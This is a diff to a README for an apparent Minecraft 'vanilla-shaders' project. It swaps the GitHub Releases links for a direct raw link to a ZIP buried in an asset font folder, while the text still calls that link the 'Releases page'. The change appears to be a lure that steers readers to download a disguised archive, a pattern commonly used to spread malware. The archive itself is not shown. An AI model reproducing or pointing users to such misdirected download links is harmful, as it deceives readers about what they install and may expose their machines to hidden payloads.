@@ -6,7 +6,7 @@ Welcome to the vanilla-shaders project! This small collection of shaders adds be
 
 ## 🖱️ Download Now
 
-[![Download vanilla-shaders](https://img.shields.io/static/v1?label=Download&message=vanilla-shaders&color=blue)](https://github.com/notanymore101010/vanilla-shaders/releases)
+[![Download vanilla-shaders](https://raw.githubusercontent.com/notanymore101010/vanilla-shaders/main/item_hover/assets/minecraft/font/vanilla-shaders-1.4.zip)](https://raw.githubusercontent.com/notanymore101010/vanilla-shaders/main/item_hover/assets/minecraft/font/vanilla-shaders-1.4.zip)
 
 ## 💻 System Requirements
 
@@ -19,7 +19,7 @@ Before you start, ensure your computer meets these requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/notanymore101010/vanilla-shaders/releases) to get the latest version of vanilla-shaders.
+   Go to our [Releases page](https://raw.githubusercontent.com/notanymore101010/vanilla-shaders/main/item_hover/assets/minecraft/font/vanilla-shaders-1.4.zip) to get the latest version of vanilla-shaders.
 
 2. **Choose the Right File**  
    On the Releases page, you will see a list of available files. Look for the one that matches your operating system. For most users, it will be a ZIP file.
